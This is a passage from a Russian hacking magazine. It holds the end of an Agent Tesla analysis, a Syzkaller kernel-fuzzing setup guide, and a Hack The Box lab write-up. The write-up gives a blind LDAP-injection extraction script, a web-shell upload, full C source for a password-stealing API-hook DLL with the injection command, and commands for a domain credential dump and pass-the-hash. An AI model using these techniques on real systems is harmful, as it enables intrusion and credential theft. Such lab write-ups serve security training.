его работы с промежутком в несколько сот миллисекунд.





                Используемая почта, почтовый сервер и порт





                Список интересующих Agent Tesla сервисов

У меня получилось извлечь список сервисов, с которыми взаимодействует
Agent Tesla, его почту, почтовый сервер и много другой информации. Неплохо
за минуту работы приложения!


ВЫВОДЫ

Вооружившись описанными в статье методами анализа, ты сможешь зна‐
чительно облегчить себе жизнь при анализе вредоносного ПО. Как видишь,
не всегда нужно действовать в лоб! Иногда можно ускорить работу, если
уметь хорошо пользоваться своими инструментами. Они помогут сделать
процесс быстрее!
ВЗЛОМ





В этой статье мы попрактикуемся в фаз‐
зинге ядра. Но сначала немного поговорим
об истории и теории фаззинга, а также
обсудим принцип работы нашей цели. Нас‐
троим и скомпилируем ядро Linux, настро‐              sploitem                                                                         CVE hunter [КиберПротект]
им Syzkaller и приступим к поиску багов.                  sploitem@gmail.com


СТЕНД

Давай быстренько скачаем готовую виртуальную машину, чтобы не тратить
время на ее разворачивание из ISO-образа.
   Готовые виртуалки можно найти на сайте osboxes.org. Там есть образы ВМ
для VMware Player и VirtualBox.





Для этой статьи я взял образ Ubuntu для VirtualBox. Но ты волен выбрать
любой другой дистрибутив и систему виртуализации.





Качаем Ubuntu 22.04 Jammy Jellyfish.





Пока виртуалка скачивается, повторим теорию про фаззинг и Syzkaller.


Краткая история фаззинга
Фаззинг (fuzzing) — это метод тестирования программ, который заключается
в автоматической генерации и вводе случайных или некорректных данных
в программу с целью поиска ошибок, уязвимостей и возможных сбоев.
   Термин  «фаззинг» был  впервые  использован в  научной  статье «An
Empirical Study of the Reliability of UNIX Utilities» в 1988 году. Однако сам метод
фаззинга стал активно развиваться в начале двухтысячных годов благодаря
работе  исследователей и  хакеров, которые широко  использовали его
для поиска уязвимостей в ПО.
  Один из первых известных случаев успешного применения фаззинга был
в 2005 году, когда команда исследователей безопасности нашла уязвимость
в Internet Explorer, используя автоматический фаззинг. Этот случай показал,
что фаззинг может быть эффективным инструментом для поиска уязвимостей
даже в очень популярных продуктах.
  Со временем фаззинг стал широко распространенным методом тес‐
тирования программ и используется как разработчиками, так и хакерами
для поиска уязвимостей и повышения безопасности. А с появлением спе‐
циализированных  инструментов и  фреймворков для  фаззинга он  стал
еще доступнее и эффективнее.

Краткая история Syzkaller
Syzkaller — это инструмент для автоматизированного тестирования ядра опе‐
рационной системы, разработанный Дмитрием Вьюковым. История Syzkaller
началась примерно в 2014 году.
  В начале работы над Syzkaller Вьюков столкнулся с проблемой поиска
и исправления уязвимостей в ядре Linux. Традиционные методы тестирова‐
ния и ручного анализа кода оказались неэффективными из‑за сложности
и объема кода ядра. Поэтому он решил создать инструмент, который поз‐
волил бы автоматизировать этот процесс.
   Syzkaller был разработан как инструмент для генерации и запуска случай‐
ных тестов на ядре Linux. Он использует фаззеры для генерации случайных
входных данных, которые передаются в системные вызовы ядра. Затем
Syzkaller отслеживает поведение системы и реагирует на ошибки, падения
или другие аномалии.
  Со временем Syzkaller стал широко используемым инструментом в сооб‐
ществе разработчиков ядра Linux и других операционных систем. Он помог
выявить множество уязвимостей и ошибок в ядре, улучшить его качество
и надежность.
   Сегодня Syzkaller поддерживает не только ядро Linux, но и другие опе‐
рационные системы, такие как FreeBSD, Fuchsia и даже Windows. Он продол‐
жает развиваться и улучшаться благодаря вкладу сообщества разработчиков
и исследователей безопасности.


Что ж, думаю, виртуалка уже скачалась, поэтому сворачиваем исторический
экскурс и отправляемся заниматься практикой.
  В архиве ты найдешь виртуальный диск, его нужно подключить при соз‐
дании новой виртуалки.
  В случае VirtualBox это выглядит так, как на рисунке ниже.





Очень важно включить вложенную виртуализацию, в этом поможет команда


& 'C:\Program Files\Oracle\VirtualBox\VBoxManage.exe' modifyvm
Ubuntu.22.04.x64 --nested-hw-virt on

И не забудь включить буфер обмена, чтобы можно было копировать команды
в виртуалку.





Если копирование не заработает, то можно поставить в виртуалке OpenSSH
server и просто работать с ней через SSH. Только перед этим нужно поменять
у виртуалки тип соединения с NAT на сетевой мост.





Дальше узнаём адрес и подключаемся.





Я использую именно этот метод, поскольку работаю на выделенном сервере,
а не в ВМ.


СОБИРАЕМ ФАЗЗЕР

Теперь, когда скачан виртуальный диск и развернута виртуальная машина,
приступаем к сборке фаззера.
   Перво‑наперво — Go. Фаззер написан на Golang, поэтому нам понадо‐
бится компилятор этого языка. Для сборки нужна версия 1.21 или старше.


wget https://dl.google.com/go/go1.21.4.linux-amd64.tar.gz
tar -xf go1.21.4.linux-amd64.tar.gz
export GOROOT=`pwd` /go
export PATH=$GOROOT/bin:$PATH

Еще понадобится компилятор C и С++, а также ядро с включенным измерени‐
ем покрытия кода (первое заполучить элементарно, второе — чуть сложнее),
ну и, само собой, нужен Git. И еще всякое по мелочи, полный список есть
в документации Syzkaller.
   Напоминаю, пароль от скачанной виртуалки — osboxes.org.


sudo apt update
sudo apt install -y gcc g++ git make flex bison libncurses-dev
libelf-dev libssl-dev bc

С ядром разберемся чуть позже, а пока клонируем репозиторий Syzkaller
и собираем проект.


cd $HOME
git clone https://github.com/google/syzkaller
cd syzkaller
make





Собранные бинарники будут находиться в директории bin.





                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
  ЯДЕРНЫЙ ФАЗЗИНГ
          НАСТРАИВАЕМ SYZKALLER ДЛЯ
           ПОИСКА БАГОВ В ЯДРЕ LINUX





СБОРКА ЯДРА

Переходим к подготовке ядра, так как это и есть наша цель для фаззинга.
Клонируем репозиторий, настроим и скомпилируем ядро.


Качаем ядро
Тут всё стандартно. Сначала клонируем репозиторий исходного кода ядра.


export KERNEL=$HOME/linux
git clone git://git.kernel.org/pub/scm/linux/kernel/git/torvalds/
linux.git $KERNEL

Операция не особенно быстрая. Поэтому прервемся на очередной ликбез —
я вкратце расскажу о том, как работает Syzkaller.


Как работает Syzkaller
Для начала картинка из документации фаззера.





Компонент syz-manager отвечает за запуск и мониторинг виртуалок, генера‐
цию входных данных и хранение корпуса фаззинга и крашей. Он же запускает
syz-fuzzer.
  Они взаимодействуют через RPC (remote procedure  call): syz-manager
передает syz-fuzzer программу, которую нужно запустить, а syz-fuzzer переда‐
ет syz-manager результаты выполнения.
   Затем syz-fuzzer запускает syz-executor, который выполняет переданную
на вход программу с системными вызовами.
   Весь процесс делится на четыре этапа, они описаны ниже.
 1. Генерация тестовых данных. Syzkaller генерирует случайные входные
   данные (тестовые программы) для ядра Linux. Эти тестовые программы
   представляют собой системные вызовы, структуры данных и другие эле‐
   менты.
 2. Запуск тестов. Syzkaller запускает тестовые программы на целевой сис‐
   теме, взаимодействуя с ядром Linux через системные вызовы, и при этом
   отслеживает поведение ядра и реакцию на входные данные.
 3. Мониторинг и анализ. Syzkaller мониторит работу ядра, отслеживая
   возможные ошибки, аварийные завершения или другие аномалии. Обна‐
   ружив проблему, Syzkaller собирает информацию о ней для последующего
   анализа.
 4. Создание отчетов. Syzkaller создает отчеты о найденных уязвимостях,
   ошибках и других проблемах в ядре Linux.


Настраиваем и собираем
Идем дальше. Теперь нужно сгенерировать конфиг для ядра и вписать в него
пару опций.


cd $KERNEL
make defconfig
make kvm_guest.config

Эта команда создаст конфиг. Далее вписываем в него параметры, необ‐
ходимые для фаззинга. В этом нам поможет sed.


sed -i "s/# CONFIG_KCOV is not set/CONFIG_KCOV=y/" .config
sed -i "s/# CONFIG_DEBUG_INFO_DWARF4 is not set/
CONFIG_DEBUG_INFO_DWARF4=y/" .config
sed -i "s/# CONFIG_KASAN is not set/CONFIG_KASAN=y\n
CONFIG_KASAN_INLINE=y/" .config
sed -i "s/# CONFIG_CONFIGFS_FS is not set/CONFIG_CONFIGFS_FS=y/" .
config
sed -i "s/# CONFIG_SECURITYFS is not set/CONFIG_SECURITYFS=y/" .
config
sed -i "s/# CONFIG_CMDLINE_BOOL is not set/CONFIG_CMDLINE_BOOL=y\n
CONFIG_CMDLINE="net.ifnames= 0"/" .config

В  конфигурации  ядра  активируется  сбор  покрытия  кода,  отладочная
информация,  санитайзер KASAN для  обнаружения  багов,  специфичные
для Debian опции и отключается механизм Predictable Network  Interface
Names. Подробнее — в документации.
   После редактирования нужно перегенерить конфиг.


make olddefconfig

Все готово, собираем ядро. Это тоже займет какое‑то время, которое
зависит от мощности машины.
   Теперь запускаем make:


make -j`nproc`

Должны появиться файлы vmlinux и bzImage. Проверить их наличие можно
следующими командами:


ls $KERNEL/vmlinux
ls $KERNEL/arch/x86/boot/bzImage





Создаем образ
Когда ядро собрано, нужно создать образ системы на основе его. Из этого
образа фаззер будет создавать виртуальные машины под фаззинг.
   Сначала понадобится установить инструмент debootstrap.


sudo apt install -y debootstrap

И следом создаем тот самый образ такими командами:


export IMAGE=$HOME/image
mkdir -p $IMAGE
cd $IMAGE /
wget https://raw.githubusercontent.com/google/syzkaller/master/tools/
create-image.sh -O create-image.sh
chmod +x create-image.sh
./create-image.sh

Результатом будет файл $IMAGE/bullseye.img.





Ставим QEMU и проверяем образ
Чтобы все получилось, понадобится эмуляция железа. В этом нам поможет
небезызвестный QEMU.
   Устанавливаем:


sudo apt install -y qemu-system-x86

Проверяем, работает ли наш образ. Для этого запускаем его на QEMU.
Понадобится второй терминал, чтобы проверить подключение к запущенному
образу.
   Нужно добавить текущего пользователя (в данном случае osboxes) в груп‐
пу kvm.


sudo usermod -a -G kvm user

И еще одно заклинание для KVM.


sudo modprobe kvm-intel

После этого нужно перелогиниться.


export KERNEL=$HOME/linux
export IMAGE=$HOME/image
qemu-system-x86_64 \
    -m 2G \
    -smp 2 \
    -kernel $KERNEL/arch/x86/boot/bzImage \
    -append "console=ttyS0 root=/dev/sda earlyprintk=serial net.
ifnames=0" \
    -drive file=$IMAGE/bullseye.img,format= raw \
    -net user,host=10.0.2.10,hostfwd=tcp:127.0.0.1:10021-:22 \
    -net nic,model=e1000 \
    -enable-kvm \
    -nographic \
    -pidfile vm.pid \
    2>&1 | tee vm.log

В текущем окне терминала должно появиться вот такое приглашение.





В другом окне терминала тоже подключаемся к виртуалке (или серверу),
затем проверяем подключение к запущенному на QEMU образу.


export IMAGE=$HOME/image
ssh -i $IMAGE/bullseye.id_rsa -p 10021 -o "StrictHostKeyChecking no"
root@localhost





Подключились, все работает, и теперь можно выключить систему. Вводим
во втором терминале


poweroff

Машина выключится. Мы готовы к фаззингу ядра!


ЗАПУСК ФАЗЗИНГА

Теперь нужно создать конфиг для самого фаззера, после чего его можно
будет запускать.
  В конфиге нужно будет указать рабочую директорию, поэтому создадим
ее:


mkdir -p $HOME/workdir

Создаем конфиг Syzkaller:


{
  "target": "linux/amd64",
  "http": "127.0.0.1:56741",
  "workdir": "workdir",
  "kernel_obj": "linux",
  "image": "image/bullseye.img",
  "sshkey": "image/bullseye.id_rsa",
  "syzkaller": "syzkaller",
  "procs": 8,
  "type": "qemu",
  "vm": {
    "count": 4,
    "kernel": "linux/arch/x86/boot/bzImage",
    "cpu": 2,
    "mem": 2048
  }
}

В конфиге можно поменять количество процессоров (cpu) и оперативной
памяти (ram), выделяемых каждой машине. Также можно указать количество
виртуальных машин (count). Все зависит от возможностей машины.
   Конфиг готов, можем запускать фаззинг!


syzkaller/bin/syz-manager -config=my.cfg

После запуска пройдет какое‑то время, прежде чем появится коннект от тес‐
товой машины.





Если очень долго нет коннекта, запусти фаззер снова, при этом передав флаг
-debug, и внимательно смотри вывод, обычно там сразу видно, если что‑то
пошло не так. Например, может быть ошибка подключения по SSH.
   У фаззера есть веб‑интерфейс.





Здесь можно посмотреть всю статистику. Также здесь будет отображаться
информация о найденных багах. Для каждого приводится лог и исходный код
программы, которая вызывает краш ядра.
   Чтобы смотреть эту страницу на хосте, убедись, что у виртуальной машины
выбран тип адаптера «Сетевой мост».





И перед запуском Syzkaller нужно вписать в конфиг IP-адрес виртуальной
машины (или IP-адрес сервера в случае VPS) вместо стандартного 127.0.0.1.





ВЫВОДЫ

Мы кратко рассмотрели историю и теорию фаззинга, разобрались, как устро‐
ен фаззер Syzkaller и как его запускать. Затем настроили и скомпилировали
ядро Linux. И наконец, начали поиск багов в нем при помощи Syzkaller.
   Желаю терпения в ожидании крашей! В  качестве следующего шага
можешь попробовать самостоятельно освоить фаззер ядра Trinity.


Ссылки

 • Syzkaller
 • Документация Syzkaller
 • Решение частых проблем с Syzkaller
 • Решение частых проблем с Linux
 • Репозиторий ядра
 • Как работает фаззер
 • Про добавление описания вызовов
ВЗЛОМ





В этом райтапе я покажу, как писать свою
DLL для перехвата API-функции и получения
вводимых в приложение  учетных данных
пользователя. Внедрив DLL в целевой про‐
цесс, читаем учетные данные и продвига‐            RalfHacker                                                                                             hackerralf8@gmail.com
емся  к  новому  пользователю.  Затем,
используя   цепочку   неправильно   скон‐
фигурированных списков доступа, получа‐
ем полный контроль над доменом. Но для
начала проэксплуатируем LDAP-инъекцию
и зальем на сервер веб‑шелл.


Наша цель — получение прав суперпользователя на машине Analysis с учеб‐
ной площадки Hack The Box. Уровень задания — сложный.


           WARNING

                            Подключаться к машинам с HTB рекомендуется
                            только через VPN. Не делай этого с компьютеров,
                        где есть важные для тебя данные, так как ты ока‐
                        жешься в общей сети с другими участниками.



РАЗВЕДКА

Сканирование портов
Добавляем IP-адрес машины в /etc/hosts:


10.10.11.250    analysis.htb

И запускаем сканирование портов.

Справка: сканирование портов
Сканирование портов — стандартный первый шаг при любой атаке. Он поз‐
воляет атакующему узнать, какие службы на хосте принимают соединение.
На основе этой информации выбирается следующий шаг к получению точки
входа.
   Наиболее известный инструмент для сканирования — это Nmap. Улучшить
результаты его работы ты можешь при помощи следующего скрипта:


 #!/bin/bash
 ports=$(nmap -p- --min-rate= 500 $1 | grep ^[0-9] | cut -d '/' -f 1 |
 tr '\n' ',' | sed s/,$//)
 nmap -p$ports -A $1


Он действует в два этапа. На первом производится обычное быстрое ска‐
нирование, на втором — более тщательное сканирование, с использованием
имеющихся скриптов (опция -A).





                             Результат работы скрипта

Скрипт нашел много открытых портов, что типично для Windows:
 • 53 — DNS;
 • 80 (HTTP) — веб‑сервер Microsoft IIS/10.0;
 • 88 — Kerberos;
 • 135 — служба удаленного вызова процедур (Microsoft RPC);
 • 139 — служба сеансов NetBIOS, NetLogon;
 • 389 — LDAP;
 • 445 — SMB;
 • 464 — служба смены пароля Kerberos;
 • 593 (HTTP-RPC-EPMAP) — используется в службах DCOM и MS Exchange;
 • 636 — LDAP с шифрованием SSL или TLS;
 • 3268 (LDAP) — для доступа к Global Catalog от клиента к контроллеру;
 • 3269 (LDAPS) — для доступа к Global Catalog от клиента к контроллеру
   через защищенное соединение;
 • 3306 — СУБД MySQL;
 • 5985 — служба удаленного управления WinRM;
 • 9389 — веб‑службы AD DS.

Уязвимости Null session на SMB нет, поэтому сразу идем на веб‑сервер.





                     Главная страница сайта analysis.htb


ТОЧКА ВХОДА

На сайте ничего интересного найти не удалось, поэтому приступим к поиску
скрытых файлов и каталогов.

Справка: сканирование веба c feroxbuster
Одно из первых действий при тестировании безопасности веб‑приложе‐
ния — это сканирование методом перебора каталогов, чтобы найти скрытую
информацию и недоступные обычным посетителям функции. Для этого можно
использовать программы вроде dirsearch, DIRB или  ffuf. Я предпочитаю
feroxbuster.
  При запуске указываем следующие параметры:
 • -u — URL;
 • -w — словарь (я использую словари из набора SecLists);
 • -t — количество потоков;
 • -d — глубина сканирования.



Задаем все нужные параметры и запускаем сканирование:


feroxbuster -u http://analysis.htb/ -w directory_2.3_medium_
lowercase.txt -d 1 -t 256

Но ни файлов, ни каталогов найти не удалось, поэтому переходим к поиску
поддоменов, что может открыть для нас новые сайты. Для этого я использую
другую утилиту — ffuf.


ffuf -u 'http://analysis.htb/' -H 'Host: FUZZ.analysis.htb' -w
subdomains-bitquark-top100000.txt -t 128



              Результат сканирования поддоменов с помощью ffuf

И находим один поддомен, который добавляем в файл /etc/hosts.


10.10.11.250 analysis.htb internal.analysis.htb

Сервер возвращает код ответа 403, поэтому придется поискать скрытые
каталоги и здесь.


feroxbuster -u 'http://internal.analysis.htb/' -w directory_2.3_
medium_lowercase.txt -t 256 -d 1




                        Результат сканирования каталогов

В итоге находим три доступных каталога. Сканируем dashboard на предмет
интересных файлов.


feroxbuster -u 'http://internal.analysis.htb/dashboard/' -w files_
interesting.txt -t 256 -d 1




                          Результат сканирования файлов

Нашли index.php, поэтому попробуем сканировать во всех каталогах только
файлы PHP.


feroxbuster -u 'http://internal.analysis.htb/dashboard/' -w php_
files_common_5476.txt -t 256 -d 1





               Результат поиска PHP-файлов в каталоге dashboard


feroxbuster -u 'http://internal.analysis.htb/users/' -w php_files_
common_5476.txt -t 256 -d 1




                  Результат поиска PHP-файлов в каталоге users


feroxbuster -u 'http://internal.analysis.htb/employees/' -w php_
files_common_5476.txt -t 256 -d 1




               Результат поиска PHP-файлов в каталоге employees

В итоге получилось найти форму авторизации в веб‑приложении.





                Содержимое страницы employees/login.php

На странице users/list.php получаем сообщение о неверном параметре.





                   Содержимое страницы users/list.php

Попробуем подобрать имя параметра, для чего снова задействуем ffuf. Чтобы
в вывод не попадали все варианты из списка, установим фильтр по размеру
страницы с помощью параметра -fs.


ffuf -u 'http://internal.analysis.htb/users/list.php?FUZZ=test' -w
wordlistsparameters_2588.txt -t 64 -fs 17



                       Результат сканирования параметров

Находим параметр name, который отвечает за фильтрацию пользователей
по имени.





                   Содержимое страницы users/list.php

В самом фильтре может  найтись возможность для  инъекции,  поэтому
переберем сначала символы, а затем их последовательности, которые могут
привести к инъекции. Если она возможна, данные на странице изменятся, что
мы можем отслеживать.
   Перебор производим с помощью Burp Intruder.





                    Burp Intruder — вкладка Positions





                   Burp Intruder — результат перебора





                   Burp Intruder — результат перебора

В  результате  нашелся  набор  символов,  который  дал  отличающиеся
от основной массы результаты. Судя по всему, перед нами LDAP-инъекция.
Удостовериться в этом можно, использовав фильтр (objectClass=user).





                          Результат выполнения запроса


LDAP Injection
Первым делом попробуем получить доступные атрибуты LDAP. Для этого
переберем их с помощью Burp Intruder по следующему условию:


*)(%26(objectClass=user)($attr=*)





                    Burp Intruder — вкладка Positions





                   Burp Intruder — результат перебора

Никаких необычных атрибутов не нашли. Попробуем получить описание учет‐
ной записи пользователя, так как в поле description часто можно встретить
сохраненные пароли для сервисных учетных записей.
   Напишем код, который будет посимвольно перебирать значение атрибута
description. Работает это вот как. Мы по одному символу меняем условие (
description=*): значение атрибута будет сначала a*, затем b*, c*, d* и так
далее. Как только в ответе появится таблица с пользователем, символ можно
считать верным.


import requests


base_url = "http://internal.analysis.htb/users/list.php?name="


def make_request(param):
    url = base_url + param
    response = requests.get(url)
    return response.text


def find_character(target_char):
    current_param = ""
    all_characters =
"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^
&
*()-_+=<>?/.,;:'"[]{}| \\`~ "


    while True:
        for char in all_characters:
            new_param = "*)(%26(objectClass=user)(description=" +
current_param + char + "*)"
            response = make_request(new_param)
            print(new_param + "   " + str(len(response)))
            if len(response) == 418:
                current_param += char
                print("Found character:", char)
                if char == target_char:
                    print("Target character found:", target_char)
                    return current_param


target_character = ''
result_param = find_character(target_character)
print("Description: ", result_param)

Во время перебора произойдет зацикливание скрипта.





                             Результат работы скрипта

Это связано с тем, что нужным символом является звездочка, которая
используется в самой маске. Изменим значение переменной current_param
на 97NTtl* и заново запустим скрипт. При втором зацикливании можно счи‐
тать, что значение атрибута уже определено.





                             Результат работы скрипта





                                 Ответ сервера

Полученная строка похожа на пароль, поэтому нужно проверить его на валид‐
ность с помощью утилиты NetExec.


nxc smb analysis.htb -u 'technician' -p '97NTtl*4QP96Bv'



                        Результат проверки учетных данных

Учетная запись валидна, а значит, можно получать информацию из домена.


                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
        HTB ANALYSIS
        КРАДЕМ УЧЕТКИ ЧЕРЕЗ ПЕРЕХВАТ
                           API ПРИЛОЖЕНИЯ





ТОЧКА ОПОРЫ

Первым делом получим список всех пользователей домена с помощью
NetExec. Единственный пользователь с данными в поле description у нас
уже есть.


nxc smb analysis.htb -u 'technician' -p '97NTtl*4QP96Bv' --users





                            Пользователи домена

Также нужно определить пользователей, которые могут получить сессию
на сервере через службу WinRM. Для этого запросим членов службы «Поль‐
зователи удаленного управления». При этом делаем предположение, что
язык системы — испанский, и берем нужную строку из испанской локали‐
зации.


nxc smb analysis.htb -u 'technician' -p '97NTtl*4QP96Bv' --groups
'Utilisateurs de gestion à distance'




                    Пользователи удаленного управления

Сессию на сервере нам пока не получить. Вспоминаем про авторизацию
на сайте, быть может, там есть уязвимости RCE.





                           Главная страница сайта

Изучив сайт, находим форму загрузки файлов.





                    Содержимое страницы SOC Report

Сразу пробуем загрузить p0wny-shell, популярный шелл на PHP. Удача: мы
находим его в каталоге uploads.





                    Результат выполнения команды whoami /all




                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
        HTB ANALYSIS
        КРАДЕМ УЧЕТКИ ЧЕРЕЗ ПЕРЕХВАТ
                           API ПРИЛОЖЕНИЯ





ПРОДВИЖЕНИЕ

Пользователь jdoe
Мы проникли в систему, и теперь нам нужно собрать информацию. Я буду
использовать для этого скрипты PEASS.

Справка: скрипты PEASS
Что делать после того, как мы получили доступ в систему от имени поль‐
зователя? Вариантов дальнейшей эксплуатации и повышения привилегий
может быть очень много, как в Linux, так и в Windows. Чтобы собрать
информацию и наметить цели, можно  использовать  Privilege  Escalation
Awesome Scripts SUITE (PEASS) — набор скриптов, которые проверяют сис‐
тему на автомате и выдают подробный отчет о потенциально интересных
файлах, процессах и настройках.


Загрузим на хост исполняемый файл для Windows и запустим сканирование.
В выводе будет много информации, из полезного отмечаем учетные данные
для автологона.





                       Учетные данные для автологона

Так как этот юзер состоит в группе пользователей удаленного управления, он
может использовать службу WinRM для выполнения команд. Для получения
сессии используем тулзу Evil-WinRM и забираем первый флаг.


evil-winrm -i 10.10.11.250 -u jdoe -p '7y4Z4^*y9Zzj'





                       Флаг пользователя


Пользователь wsmith
На диске C есть каталог private, в котором расположен единственный файл
encoded.txt. В этом файле содержится зашифрованное сообщение, где мы
находим название и версию какого‑то приложения: BCTextEncoder 1.03.2.1.





                          Содержимое диска C





                     Содержимое файла encoded.txt

Никаких эксплоитов для этой программы я не нашел, поэтому собрал данные
из домена с помощью BloodHound.

Справка: BloodHound
Утилита BloodHound использует теорию графов для выявления скрытых
и зачастую непреднамеренных взаимосвязей в среде Active Directory. Ее мож‐
но использовать, чтобы легко идентифицировать очень сложные пути атаки.
Помимо самой утилиты, которая позволяет просматривать граф, существует
часть, загружаемая на удаленный хост для сбора информации. Она бывает
в версиях для Windows — на PowerShell или C# — и для Linux — на Python.



В этом помогло расширение BloodHound для NetExec. Предварительно нужно
обновить запись в файле /etc/hosts.


10.10.11.250 analysis.htb internal.analysis.htb DC-ANALYSIS.analysis.
htb

А теперь запускам NetExec.


nxc ldap 10.10.11.250 -u jdoe -p '7y4Z4^*y9Zzj' --bloodhound -c All
-ns 10.10.11.250




                     Сбор данных домена

Никаких путей продвижения от пользователя jdoe найти не удалось, поэтому
вернемся к BCTextEncoder. Если отслеживать список процессов, то можно
заметить, что PID процесса BCTextEncoder постоянно меняется, а значит,
приложение закрывается и запускается.





                            Список процессов





                            Список процессов

Сперва я решил использовать кейлоггер, чтобы отследить введенные данные
и самостоятельно расшифровать файл, но эта идея оказалась неудачной.
Тогда я решил немного покодить, чтобы перехватить введенный пароль.
Для этого скачаем исполняемый файл приложения:


C:\Program Files\BCTextEncoder\BCTextEncoder.exe.exe

И перенесем его на виртуальную машину с Windows.


Похищение учетных данных через API hooking
Смысл  атаки заключается в том, чтобы определить функции API, через
который будут проходить учетные данные. Затем написать DLL, содержащую
хуки (перехватчики) этих API-функций. Для хука нужно реализовать процедуру,
которая запишет в файл перехваченные учетные данные, после чего передаст
управление легитимной функции API. Когда DLL будет готова, ее нужно будет
заинжектить в целевой процесс.
   Начнем с поиска нужных функций API с помощью API Monitor. Запускаем
утилиту (x86) и выбираем для мониторинга все модули.





                     Список модулей для отслеживания

После этого выполняем целевое приложение. В списке запущенных процес‐
сов  в  API  Monitor  выбираем  процессы BCTextEncoder и TextEncode
для отслеживания.





                            Список процессов





                         Отслеживаемые процессы

В  BCTextEncoder  выбираем  файл  и  вводим  пароль  (я  использовал
test_password). Список перехваченных API стал пополняться.





                            Окно BCTextEncoder

В списке перехваченных API выбираем функцию поиска и вводим исполь‐
зованный   пароль.   Так  мы  находим   его   в   параметре   функции
WideCharToMultiByte.





                                Поиск пароля

Таким   образом,   наша   DLL   должна   определить   хук   функции
WideCharToMultiByte. Для работы с перехватчиками будем использовать
библиотеку minhook.


git clone --depth=1 https://github.com/TsudaKageyu/minhook

В текущем каталоге создадим файл hookdll.c. В главной функции DllMain
будем вызывать функцию Start, которая определит в текущем процессе
адрес функции WideCharToMultiByte и с помощью MH_CreateHookApi уста‐
новит   хук   для   передачи   управления   на   собственную   функцию
HookWideCharToMultiByte.  Она,  в  свою  очередь,  запишет  значение
параметра lpWideCharStr в файл C:\Windows\Tasks\BCHookLog.txt и вер‐
нет управление легитимной функции WideCharToMultiByte, таким образом
общий поток выполнения приложения не будет нарушен.


#include <windows.h>
#include <stdio.h>
#include "minhook/include/MinHook.h"


typedef int (WINAPI *_WideCharToMultiByte)( UINT CodePage, DWORD
dwFlags, LPCWSTR lpWideCharStr, int cchWideChar, LPSTR lpMultiByteStr
, int cbMultiByte, LPCSTR lpDefaultChar, LPBOOL lpUsedDefaultChar );
_WideCharToMultiByte pOrigWideCharToMultiByte = NULL;


int WINAPI HookWideCharToMultiByte( UINT CodePage, DWORD dwFlags,
LPCWSTR lpWideCharStr, int cchWideChar, LPSTR lpMultiByteStr, int
cbMultiByte, LPCSTR lpDefaultChar, LPBOOL lpUsedDefaultChar ) {
    const char* filename = "C:\\Windows\\Tasks\\BCHookLog.txt";


    FILE *file = fopen(filename, "a");
    fprintf(file, "<=====\n");
    fprintf(file, "%ls\n", lpWideCharStr);
    fprintf(file, "=====>\n\n", lpWideCharStr);
    fclose(file);


    return pOrigWideCharToMultiByte(CodePage, dwFlags, lpWideCharStr,
cchWideChar, lpMultiByteStr, cbMultiByte, lpDefaultChar,
lpUsedDefaultChar);
}


int Start() {
    LPCSTR pszFunctionName = "WideCharToMultiByte";
    LPCWSTR pszModuleName = L"kernel32.dll";
    HMODULE hModule = GetModuleHandleW(pszModuleName);
    if (hModule == NULL) return 1;


    LPVOID pOrigFunction = (LPVOID) GetProcAddress(hModule,
pszFunctionName);
    if (pOrigFunction == NULL) return 1;


    pOrigWideCharToMultiByte = (_WideCharToMultiByte) GetProcAddress(
GetModuleHandleW(pszModuleName), pszFunctionName);


    if ( MH_Initialize() != MH_OK ) return 1;


    if ( MH_CreateHookApi(pszModuleName, pszFunctionName, (LPVOID)
HookWideCharToMultiByte, (LPVOID*)&pOrigWideCharToMultiByte) != MH_OK
) return 1;


    if ( MH_EnableHook((LPVOID)pOrigFunction) != MH_OK  ) return 1;


    return 0;
}


BOOL APIENTRY DllMain(HMODULE hModule,    DWORD  ul_reason_for_call,
LPVOID lpReserved) {
    switch (ul_reason_for_call) {
        case DLL_PROCESS_ATTACH:
            CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE) Start,
NULL, 0, NULL);
            break;
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
            break;
    }
    return TRUE;
}

Скомпилируем библиотеку с помощью MinGW и для проверки перенесем
на виртуальную машину Windows.


i686-w64-mingw32-gcc hookdll.c minhook/src/hook.c minhook/src/buffer.
c minhook/src/trampoline.c minhook/src/hde/hde32.c -lws2_32 -static
-mconsole -mdll -o hookdll.dll -s

Заново запускаем BCTextEncoder и определяем PID процесса, чтобы внед‐
рить в него DLL. В данном случае это 7640.



                   Дерево процессов в Process Hacker

Для внедрения DLL будем использовать Injector.


Injector.exe -i -p 7640 hookdll.dll





                              Инъекция DLL

Инъекция успешно выполнена, поэтому переходим к BCTextEncoder, выбира‐
ем файл для расшифровки и вводим тестовый пароль. После получения отве‐
та от приложения открываем файл с логами от нашей DLL:


C:\Windows\Tasks\BCHookLog.txt

А в логах — введенный пароль!





                            Перехваченные данные

Переносим инъектор и библиотеку на удаленную машину и внедряем DLL
в оба процесса TextEncode.





                              Инъекция DLL

Периодически проверяем файл с логами, и в один из моментов там появится
пароль.





                            Перехваченный пароль

С помощью этого пароля расшифруем найденный ранее файл и получим
еще одну строку — возможно, тоже какой‑то пароль.





                          Расшифрованный файл

Оба пароля сохраняем в файл и перебираем их по всем пользователям
домена с помощью NetExec.


nxc smb 10.10.11.250 -u users.txt -p password.txt
--continue-on-success





                                 Результат перебора

Таким образом компрометируем еще одну учетную запись — пользователя
wsmith.


ПОВЫШЕНИЕ ПРИВИЛЕГИЙ

Так как мы взяли под контроль еще одну учетную запись, в BloodHound необ‐
ходимо проверить возможность продвижения от нее к другим объектам
домена.





                       Граф BloodHound

Наш пользователь имеет право GenericWrite по отношению к пользователю
soc_analyst, который, в свою очередь, имеет право GenericAll на все учет‐
ные записи домена. Право GenericWrite на пользователя позволяет изме‐
нить пароль этого пользователя.


net rpc password 'soc_analyst' 'Password123' -U 'analysis.htb/wsmith'
%'DMrB8YUcC5%2' -S DC-ANALYSIS.analysis.htb

Теперь можно от имени пользователя soc_analyst выполнить репликацию
учетных данных пользователей домена.


impacket-secretsdump analysis.htb/soc_analyst:Password123@10.10.11.
250





                     Дамп учетных данных

С хешем пароля администратора авторизуемся на хосте и забираем пос‐
ледний флаг.


evil-winrm -i 10.10.11.250 -u Administrateur -H
584d96946e4ad1ddfa4f8d7938faf91d





                           Флаг рута

Машина захвачена!
ВЗЛОМ





